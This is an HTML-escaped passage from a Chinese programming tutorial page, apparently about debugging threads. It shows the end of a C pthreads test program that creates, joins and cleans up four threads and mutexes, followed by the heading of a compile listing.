&lt;span class=&quot;crayon-h&quot;&gt;        &lt;/span&gt;&lt;span class=&quot;crayon-t&quot;&gt;char&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;szBuf&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;crayon-cn&quot;&gt;128&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;]&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;;&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;
&lt;/div&gt;
&lt;div class=&quot;crayon-line crayon-striped-line&quot; id=&quot;crayon-587a973a07774403199713-82&quot;&gt;
&lt;span class=&quot;crayon-h&quot;&gt;        &lt;/span&gt;&lt;span class=&quot;crayon-e&quot;&gt;memset&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;szBuf&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-cn&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-e&quot;&gt;sizeof&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;szBuf&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;;&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;
&lt;/div&gt;
&lt;div class=&quot;crayon-line&quot; id=&quot;crayon-587a973a07774403199713-83&quot;&gt;
&lt;span class=&quot;crayon-h&quot;&gt;        &lt;/span&gt;&lt;span class=&quot;crayon-e&quot;&gt;strcpy&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;szBuf&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-s&quot;&gt;&quot;thread3&quot;&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;;&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;
&lt;/div&gt;
&lt;div class=&quot;crayon-line crayon-striped-line&quot; id=&quot;crayon-587a973a07774403199713-84&quot;&gt;
&lt;span class=&quot;crayon-h&quot;&gt;    &lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;}&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;
&lt;/div&gt;
&lt;div class=&quot;crayon-line&quot; id=&quot;crayon-587a973a07774403199713-85&quot;&gt;
&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;}&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;
&lt;/div&gt;
&lt;div class=&quot;crayon-line crayon-striped-line&quot; id=&quot;crayon-587a973a07774403199713-86&quot;&gt; &lt;/div&gt;
&lt;div class=&quot;crayon-line&quot; id=&quot;crayon-587a973a07774403199713-87&quot;&gt;
&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-t&quot;&gt;int&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-e&quot;&gt;main&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;
&lt;/div&gt;
&lt;div class=&quot;crayon-line crayon-striped-line&quot; id=&quot;crayon-587a973a07774403199713-88&quot;&gt;
&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;{&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;
&lt;/div&gt;
&lt;div class=&quot;crayon-line&quot; id=&quot;crayon-587a973a07774403199713-89&quot;&gt;
&lt;span class=&quot;crayon-h&quot;&gt;    &lt;/span&gt;&lt;span class=&quot;crayon-e&quot;&gt;pthread_t &lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;tid&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;crayon-cn&quot;&gt;4&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;]&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;;&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;
&lt;/div&gt;
&lt;div class=&quot;crayon-line crayon-striped-line&quot; id=&quot;crayon-587a973a07774403199713-90&quot;&gt;
&lt;span class=&quot;crayon-h&quot;&gt;    &lt;/span&gt;&lt;span class=&quot;crayon-st&quot;&gt;if&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;crayon-e&quot;&gt;pthread_create&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;&amp;amp;&lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;tid&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;crayon-cn&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;]&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-t&quot;&gt;NULL&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;&amp;amp;&lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;thread1&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-t&quot;&gt;NULL&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;!=&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-cn&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;
&lt;/div&gt;
&lt;div class=&quot;crayon-line&quot; id=&quot;crayon-587a973a07774403199713-91&quot;&gt;
&lt;span class=&quot;crayon-h&quot;&gt;    &lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;{&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;
&lt;/div&gt;
&lt;div class=&quot;crayon-line crayon-striped-line&quot; id=&quot;crayon-587a973a07774403199713-92&quot;&gt;
&lt;span class=&quot;crayon-h&quot;&gt;        &lt;/span&gt;&lt;span class=&quot;crayon-e&quot;&gt;_exit&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;crayon-cn&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;;&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;
&lt;/div&gt;
&lt;div class=&quot;crayon-line&quot; id=&quot;crayon-587a973a07774403199713-93&quot;&gt;
&lt;span class=&quot;crayon-h&quot;&gt;    &lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;}&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;
&lt;/div&gt;
&lt;div class=&quot;crayon-line crayon-striped-line&quot; id=&quot;crayon-587a973a07774403199713-94&quot;&gt;
&lt;span class=&quot;crayon-h&quot;&gt;    &lt;/span&gt;&lt;span class=&quot;crayon-st&quot;&gt;if&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;crayon-e&quot;&gt;pthread_create&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;&amp;amp;&lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;tid&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;crayon-cn&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;]&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-t&quot;&gt;NULL&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;&amp;amp;&lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;thread2&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-t&quot;&gt;NULL&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;!=&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-cn&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;
&lt;/div&gt;
&lt;div class=&quot;crayon-line&quot; id=&quot;crayon-587a973a07774403199713-95&quot;&gt;
&lt;span class=&quot;crayon-h&quot;&gt;    &lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;{&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;
&lt;/div&gt;
&lt;div class=&quot;crayon-line crayon-striped-line&quot; id=&quot;crayon-587a973a07774403199713-96&quot;&gt;
&lt;span class=&quot;crayon-h&quot;&gt;        &lt;/span&gt;&lt;span class=&quot;crayon-e&quot;&gt;_exit&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;crayon-cn&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;;&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;
&lt;/div&gt;
&lt;div class=&quot;crayon-line&quot; id=&quot;crayon-587a973a07774403199713-97&quot;&gt;
&lt;span class=&quot;crayon-h&quot;&gt;    &lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;}&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;
&lt;/div&gt;
&lt;div class=&quot;crayon-line crayon-striped-line&quot; id=&quot;crayon-587a973a07774403199713-98&quot;&gt;
&lt;span class=&quot;crayon-h&quot;&gt;    &lt;/span&gt;&lt;span class=&quot;crayon-st&quot;&gt;if&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;crayon-e&quot;&gt;pthread_create&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;&amp;amp;&lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;tid&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;crayon-cn&quot;&gt;2&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;]&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-t&quot;&gt;NULL&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;&amp;amp;&lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;thread3&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-t&quot;&gt;NULL&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;!=&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-cn&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;
&lt;/div&gt;
&lt;div class=&quot;crayon-line&quot; id=&quot;crayon-587a973a07774403199713-99&quot;&gt;
&lt;span class=&quot;crayon-h&quot;&gt;    &lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;{&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;
&lt;/div&gt;
&lt;div class=&quot;crayon-line crayon-striped-line&quot; id=&quot;crayon-587a973a07774403199713-100&quot;&gt;
&lt;span class=&quot;crayon-h&quot;&gt;        &lt;/span&gt;&lt;span class=&quot;crayon-e&quot;&gt;_exit&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;crayon-cn&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;;&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;
&lt;/div&gt;
&lt;div class=&quot;crayon-line&quot; id=&quot;crayon-587a973a07774403199713-101&quot;&gt;
&lt;span class=&quot;crayon-h&quot;&gt;    &lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;}&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;
&lt;/div&gt;
&lt;div class=&quot;crayon-line crayon-striped-line&quot; id=&quot;crayon-587a973a07774403199713-102&quot;&gt;
&lt;span class=&quot;crayon-h&quot;&gt;    &lt;/span&gt;&lt;span class=&quot;crayon-st&quot;&gt;if&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;crayon-e&quot;&gt;pthread_create&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;&amp;amp;&lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;tid&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;crayon-cn&quot;&gt;3&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;]&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-t&quot;&gt;NULL&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;&amp;amp;&lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;thread4&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-t&quot;&gt;NULL&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;!=&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-cn&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;
&lt;/div&gt;
&lt;div class=&quot;crayon-line&quot; id=&quot;crayon-587a973a07774403199713-103&quot;&gt;
&lt;span class=&quot;crayon-h&quot;&gt;    &lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;{&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;
&lt;/div&gt;
&lt;div class=&quot;crayon-line crayon-striped-line&quot; id=&quot;crayon-587a973a07774403199713-104&quot;&gt;
&lt;span class=&quot;crayon-h&quot;&gt;        &lt;/span&gt;&lt;span class=&quot;crayon-e&quot;&gt;_exit&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;crayon-cn&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;;&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;
&lt;/div&gt;
&lt;div class=&quot;crayon-line&quot; id=&quot;crayon-587a973a07774403199713-105&quot;&gt;
&lt;span class=&quot;crayon-h&quot;&gt;    &lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;}&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;
&lt;/div&gt;
&lt;div class=&quot;crayon-line crayon-striped-line&quot; id=&quot;crayon-587a973a07774403199713-106&quot;&gt; &lt;/div&gt;
&lt;div class=&quot;crayon-line&quot; id=&quot;crayon-587a973a07774403199713-107&quot;&gt;
&lt;span class=&quot;crayon-h&quot;&gt;    &lt;/span&gt;&lt;span class=&quot;crayon-e&quot;&gt;sleep&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;crayon-cn&quot;&gt;5&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;;&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;
&lt;/div&gt;
&lt;div class=&quot;crayon-line crayon-striped-line&quot; id=&quot;crayon-587a973a07774403199713-108&quot;&gt;
&lt;span class=&quot;crayon-h&quot;&gt;    &lt;/span&gt;&lt;span class=&quot;crayon-c&quot;&gt;//pthread_cancel(tid[0]); &lt;/span&gt;
&lt;/div&gt;
&lt;div class=&quot;crayon-line&quot; id=&quot;crayon-587a973a07774403199713-109&quot;&gt; &lt;/div&gt;
&lt;div class=&quot;crayon-line crayon-striped-line&quot; id=&quot;crayon-587a973a07774403199713-110&quot;&gt;
&lt;span class=&quot;crayon-h&quot;&gt;    &lt;/span&gt;&lt;span class=&quot;crayon-e&quot;&gt;pthread_join&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;tid&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;crayon-cn&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;]&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-t&quot;&gt;NULL&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;;&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;
&lt;/div&gt;
&lt;div class=&quot;crayon-line&quot; id=&quot;crayon-587a973a07774403199713-111&quot;&gt;
&lt;span class=&quot;crayon-h&quot;&gt;    &lt;/span&gt;&lt;span class=&quot;crayon-e&quot;&gt;pthread_join&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;tid&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;crayon-cn&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;]&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-t&quot;&gt;NULL&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;;&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;
&lt;/div&gt;
&lt;div class=&quot;crayon-line crayon-striped-line&quot; id=&quot;crayon-587a973a07774403199713-112&quot;&gt;
&lt;span class=&quot;crayon-h&quot;&gt;    &lt;/span&gt;&lt;span class=&quot;crayon-e&quot;&gt;pthread_join&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;tid&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;crayon-cn&quot;&gt;2&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;]&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-t&quot;&gt;NULL&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;;&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;
&lt;/div&gt;
&lt;div class=&quot;crayon-line&quot; id=&quot;crayon-587a973a07774403199713-113&quot;&gt;
&lt;span class=&quot;crayon-h&quot;&gt;    &lt;/span&gt;&lt;span class=&quot;crayon-e&quot;&gt;pthread_join&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;tid&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;crayon-cn&quot;&gt;3&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;]&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-t&quot;&gt;NULL&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;;&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;
&lt;/div&gt;
&lt;div class=&quot;crayon-line crayon-striped-line&quot; id=&quot;crayon-587a973a07774403199713-114&quot;&gt; &lt;/div&gt;
&lt;div class=&quot;crayon-line&quot; id=&quot;crayon-587a973a07774403199713-115&quot;&gt;
&lt;span class=&quot;crayon-h&quot;&gt;    &lt;/span&gt;&lt;span class=&quot;crayon-e&quot;&gt;pthread_mutex_destroy&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;&amp;amp;&lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;mutex1&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;;&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;
&lt;/div&gt;
&lt;div class=&quot;crayon-line crayon-striped-line&quot; id=&quot;crayon-587a973a07774403199713-116&quot;&gt;
&lt;span class=&quot;crayon-h&quot;&gt;    &lt;/span&gt;&lt;span class=&quot;crayon-e&quot;&gt;pthread_mutex_destroy&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;&amp;amp;&lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;mutex2&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;;&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;
&lt;/div&gt;
&lt;div class=&quot;crayon-line&quot; id=&quot;crayon-587a973a07774403199713-117&quot;&gt;
&lt;span class=&quot;crayon-h&quot;&gt;    &lt;/span&gt;&lt;span class=&quot;crayon-e&quot;&gt;pthread_mutex_destroy&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;&amp;amp;&lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;mutex3&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;;&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;
&lt;/div&gt;
&lt;div class=&quot;crayon-line crayon-striped-line&quot; id=&quot;crayon-587a973a07774403199713-118&quot;&gt;
&lt;span class=&quot;crayon-h&quot;&gt;    &lt;/span&gt;&lt;span class=&quot;crayon-e&quot;&gt;pthread_mutex_destroy&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;&amp;amp;&lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;mutex4&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;;&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;
&lt;/div&gt;
&lt;div class=&quot;crayon-line&quot; id=&quot;crayon-587a973a07774403199713-119&quot;&gt; &lt;/div&gt;
&lt;div class=&quot;crayon-line crayon-striped-line&quot; id=&quot;crayon-587a973a07774403199713-120&quot;&gt;
&lt;span class=&quot;crayon-h&quot;&gt;    &lt;/span&gt;&lt;span class=&quot;crayon-st&quot;&gt;return&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-cn&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;;&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;
&lt;/div&gt;
&lt;div class=&quot;crayon-line&quot; id=&quot;crayon-587a973a07774403199713-121&quot;&gt;
&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;}&lt;/span&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;/td&gt;
					&lt;/tr&gt;
				&lt;/table&gt;
			&lt;/div&gt;
		&lt;/div&gt;
&lt;!-- [Format Time: 0.0151 seconds] --&gt;

&lt;/div&gt;
&lt;h5 id=&quot;listing2&quot;&gt;清单 2. 编译测试程序&lt;/h5&gt;
&lt;div&gt;
&lt;!-- Crayon Syntax Highlighter v2.7.1.1 --&gt;

		&lt;div id=&quot;crayon-587a973a07783561306474&quot; class=&quot;crayon-syntax crayon-theme-github crayon-font-monaco crayon-os-pc print-yes notranslate&quot; data-settings=&quot; minimize scroll-always&quot; style=&quot; margin-top: 12px; margin-bottom: 12px; font-size: 13px !important; line-height: 15px !important;&quot;&gt;
		
			&lt;div class=&quot;crayon-toolbar&quot; data-settings=&quot; show&quot; style=&quot;font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;&quot;&gt;
&lt;span class=&quot;crayon-title&quot;&gt;&lt;/span&gt;
			&lt;div class=&quot;crayon-tools&quot; style=&quot;font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;&quot;&gt;
&lt;div class=&quot;crayon-button crayon-nums-button&quot; title=&quot;切换是否显示行编号&quot;&gt;&lt;div class=&quot;crayon-button-icon&quot;&gt;&lt;/div&gt;&lt;/div&gt;
